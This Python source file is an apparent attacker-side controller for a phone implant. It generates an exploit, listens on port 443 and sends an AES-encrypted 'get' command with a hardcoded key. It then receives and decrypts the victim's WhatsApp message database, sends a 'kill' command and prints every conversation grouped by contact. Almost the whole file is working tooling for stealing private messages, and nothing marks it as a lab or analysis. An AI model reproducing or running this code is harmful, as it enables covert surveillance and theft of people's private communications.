import http.server, socket, sqlite3, json, requests, datetime, os, time, subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from Crypto.Cipher import AES
import gen_exploit
import os

# uses port 12345, ensure later processes use a different port
# TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received

def prepare_implant():
    pass


def steal_database():
    key = "546869732069732061206b6579313233"
    iv = "5468697320697320616e204956343536"
    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
    ciphertext = obj.encrypt(b"get" + b"\x00" * 13)
    print("The get command has been encrypted")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 443             
    s.bind(('', port))
    s.listen(1)
    print("Listening on port 443 for a connection from the phone")
    print('All parts are now running and the phone can now connect')
    conn, addr = s.accept()
    print('Got connection from: ', addr)
    conn.send(ciphertext)
    print("Encrypted 'get database' command sent to phone")
    count = 0
    conn.settimeout(5)
    with open("msgstore.db.enc", "wb") as db:
        database = conn.recv(8192)
        while database:
            try:
                if count % 10:
                    print(count)
                count +=1 
                db.write(database)
                database = conn.recv(8192)
            except:
                break

    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
    print("Encrypted database has been received")
    with open('msgstore.db.enc', 'rb') as db_enc:
        with open("msgstore.db", 'wb') as db:
            enc_data = db_enc.read()
            data = obj.decrypt(enc_data)
            db.write(data)
    print("Database has been decrypted")
    obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
    kill_ciphertext =  obj.encrypt(b"kill" + b"\x00" * 12)
    print("The kill command has been encrypted")
    conn.send(kill_ciphertext)
    print("The kill command has been sent to the phone")

    
# Parses WhatsApp message database and stores the messages in a dictionary
def decode_whatsapp_messages():
    print("Starting to decode WhatsApp messages from the SQLite3 Database")
    path_to_msg_database = 'msgstore.db'
    c = connect_to_db(path_to_msg_database)
    c.execute("SELECT * FROM legacy_available_messages_view;")
    messages = c.fetchall()
    
    # message tuple design key = contact values = (message, from_me, timestamp)
    message_dict = {}
    for message in messages:
        if message[1] not in message_dict:
            if message[6] is not None:
                message_dict[message[1]] = [(message[6], message[2], message[7])]
        else:
            message_dict[message[1]].append((message[6], message[2], message[7]))

    for key in message_dict.keys():
        print("Key : {} , Value : {}".format(key,message_dict[key]))


def connect_to_db(filepath):
    conn = sqlite3.connect(filepath)
    c = conn.cursor()
    return c

if __name__ == "__main__":
    gen_exploit.gen_exploit()
    steal_database()
    time.sleep(5)
    decode_whatsapp_messages()
 
   
